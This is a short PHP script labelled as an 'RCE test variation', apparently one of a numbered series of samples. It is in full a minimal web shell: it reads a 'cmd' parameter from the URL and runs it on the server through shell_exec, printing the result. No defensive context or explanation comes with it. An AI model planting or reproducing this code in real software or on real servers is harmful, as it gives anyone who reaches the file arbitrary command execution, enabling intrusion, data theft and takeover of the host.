<?php
// RCE test variation #606
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>